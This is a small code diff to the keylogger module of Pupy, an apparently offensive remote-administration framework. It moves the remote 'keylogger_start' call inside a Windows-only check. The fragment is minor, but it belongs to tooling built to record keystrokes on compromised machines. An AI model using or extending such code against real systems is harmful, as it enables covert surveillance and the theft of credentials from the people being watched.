@@ -37,9 +37,8 @@ class KeyloggerModule(PupyModule):
     def run(self, args):
 
         if args.action=="start":
-            keylogger_start = self.client.remote('pupwinutils.keylogger', 'keylogger_start', False)
-
             if self.client.is_windows():
+                keylogger_start = self.client.remote('pupwinutils.keylogger', 'keylogger_start', False)
                 if not keylogger_start():
                     self.error("the keylogger is already started")
                 else:
